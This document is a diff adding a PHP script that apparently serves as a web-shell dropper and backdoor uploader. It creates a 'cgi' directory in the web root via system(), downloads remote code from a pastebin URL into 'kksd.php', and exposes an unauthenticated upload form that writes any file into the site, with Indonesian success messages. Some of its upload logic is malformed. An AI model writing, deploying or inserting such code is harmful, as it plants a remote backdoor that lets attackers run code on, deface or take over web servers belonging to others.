@@ -1,0 +1,34 @@
+<?php
+$secho0 = $_SERVER['DOCUMENT_ROOT'] . '/cgi/index.html';
+$secho = $_SERVER['DOCUMENT_ROOT'] . '/cgi';
+$sedo = $_SERVER['SERVER_NAME'] . '/cgi';
+echo $secho;
+
+  $cmd = "mkdir $secho";
+system($cmd);
+
+$nama3= fopen($secho . '/kksd.php' ,'w+');
+  $file3 = file_get_contents('https://pastebin.com/raw/9Eb7yb8S');
+  $tulis3 = fwrite ($nama3 ,$file3);
+ fclose($nama3);
+
+echo '<b>';
+
+echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+if( $_POST['_upl'] == "Upload" ) 
+
+$destFile = "$secho0".$_FILES['file'][''];
+{ if(@copy($_FILES['file']['tmp_name'], $destFile)) 
+{ echo 'Upload Sukses bang!<b><br><br>'; }
+else { echo 'Masukan filemu diatas</b><br><br>'; }
+}
+
+{ if(@copy($_FILES['file']['tmp_name'], $destFile)) 
+{ echo '<a href="../cgi">' . $sedo; echo '</a>  Sukses !! '; }
+else { echo '.'; }
+}
+
+//echo '<a href="../cgi">' . $sedo; echo '</a>';
+?>
+
